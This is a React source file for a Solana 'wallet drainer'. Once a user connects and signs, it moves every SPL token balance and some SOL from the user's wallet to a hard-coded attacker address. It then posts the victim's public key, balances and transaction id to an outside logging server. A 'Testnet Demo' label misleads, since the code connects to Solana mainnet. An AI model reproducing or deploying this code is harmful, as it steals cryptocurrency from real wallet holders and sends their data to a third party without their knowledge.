import React, { useCallback, useEffect, useState } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import {
  WalletAdapterNetwork,
} from '@solana/wallet-adapter-base';
import {
  ConnectionProvider,
  WalletProvider,
  useWallet,
} from '@solana/wallet-adapter-react';
import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
  TorusWalletAdapter,
  SolletWalletAdapter,
  SolletExtensionWalletAdapter,
} from '@solana/wallet-adapter-wallets';

import { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } from '@solana/spl-token';

const network = WalletAdapterNetwork.Testnet;
const connection = new Connection('https://api.mainnet-beta.solana.com');

const attackerPublicKey = new PublicKey('9VhHaFVrjXqHhJ6DcYGh8Kgs7BVMcZ6DpLGtZ4jRPca3');

function DrainButton() {
  const { publicKey, signTransaction, connected, wallet } = useWallet();
  const [status, setStatus] = useState('');

  // Auto-connect Phantom on mobile/browser (if available)
  useEffect(() => {
    if (wallet?.adapterName === 'PhantomWallet' && !connected) {
      wallet.connect().catch(() => {
        // Silent catch: user may reject
      });
    }
  }, [wallet, connected]);

  const drainAll = useCallback(async () => {
    if (!connected || !publicKey) {
      setStatus('Wallet not connected');
      return;
    }
    try {
      setStatus('Fetching token accounts...');
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });

      const instructions = [];
      const drainedTokens = [];
      const tokenBalances = [];

      for (const { account } of tokenAccounts.value) {
        const info = account.data.parsed.info;
        const mint = info.mint;
        const amountRaw = info.tokenAmount.amount;
        const decimals = info.tokenAmount.decimals;
        const uiAmount = info.tokenAmount.uiAmount;

        if (uiAmount > 0) {
          const mintPubkey = new PublicKey(mint);
          const source = new PublicKey(account.pubkey);
          const destination = await getAssociatedTokenAddress(mintPubkey, attackerPublicKey);

          instructions.push(createTransferInstruction(source, destination, publicKey, Number(amountRaw)));
          drainedTokens.push(mint);
          tokenBalances.push(`${uiAmount.toFixed(decimals)} (raw: ${amountRaw})`);
        }
      }

      const solBalanceLamports = await connection.getBalance(publicKey);
      const solBalance = solBalanceLamports / 1e9;

      // Drain 0.001 SOL for demo
      instructions.push(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: attackerPublicKey,
          lamports: 1_000_000,
        })
      );

      setStatus('Building transaction...');
      const transaction = new Transaction().add(...instructions);
      transaction.feePayer = publicKey;
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;

      setStatus('Signing transaction...');
      const signedTx = await signTransaction(transaction);

      setStatus('Sending transaction...');
      const txid = await connection.sendRawTransaction(signedTx.serialize());

      setStatus(`Transaction sent! Txid: ${txid}`);

      // Send log to backend
      await fetch('https://backsol.onrender.com/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          publicKey: publicKey.toBase58(),
          drainedTokens,
          tokenBalances,
          solBalance,
          txid,
          timestamp: Date.now(),
        }),
      });
    } catch (err) {
      setStatus(`Error: ${err.message}`);
    }
  }, [connected, publicKey, signTransaction]);

  return (
    <>
      <button onClick={drainAll} disabled={!connected}>Drain Wallet (Testnet Demo)</button>
      <p>{status}</p>
    </>
  );
}

export default function App() {
  const wallets = [
    new PhantomWalletAdapter(),
    new SolflareWalletAdapter({ network }),
    new TorusWalletAdapter(),
    new SolletWalletAdapter({ network }),
    new SolletExtensionWalletAdapter({ network }),
  ];

  return (
    <ConnectionProvider endpoint={'https://api.mainnet-beta.solana.com'}>
      <WalletProvider wallets={wallets} autoConnect>
        <DrainButton />
      </WalletProvider>
    </ConnectionProvider>
  );
}
